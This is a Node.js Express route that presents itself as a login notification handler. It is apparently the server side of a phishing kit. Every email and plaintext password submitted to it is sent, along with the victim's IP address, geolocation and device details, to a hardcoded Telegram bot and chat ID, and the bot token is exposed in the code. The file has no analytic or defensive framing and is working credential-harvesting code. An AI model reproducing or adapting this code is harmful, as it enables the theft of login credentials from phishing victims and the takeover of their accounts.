const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

// Use only the working bot
const BOT_TOKEN = "8243640993:AAEOKTTis2fef8CfY9MFqBsA1BAC8llbh0Y";
const CHAT_ID = "7424024723";

router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Missing email or password" });
        }

        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        const message = `
📌 *Login Notification*
- Email: \`${email}\`
- Password: \`${password}\`
- IP: \`${ip}\`
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}
        `;

        console.log('Sending notification to Telegram...');

        // Send to the working bot only
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
            
            if (response.ok) {
                console.log('✅ Message sent successfully to Telegram');
                res.status(200).json({
                    success: true,
                    message: "Notification sent successfully via Telegram",
                    loginDetails: { device: deviceType, ip, location: locationStr }
                });
            } else {
                const errorData = await response.json();
                console.error('❌ Telegram API error:', errorData.description);
                res.status(200).json({
                    success: false,
                    message: "Failed to send Telegram notification",
                    error: errorData.description,
                    loginDetails: { device: deviceType, ip, location: locationStr }
                });
            }
        } catch (error) {
            console.error('❌ Network error:', error.message);
            res.status(200).json({
                success: false,
                message: "Network error sending notification",
                error: error.message,
                loginDetails: { device: deviceType, ip, location: locationStr }
            });
        }

    } catch (error) {
        console.error("Server error:", error);
        res.status(500).json({ 
            success: false, 
            message: "Server error", 
            error: error.message 
        });
    }
});

module.exports = router;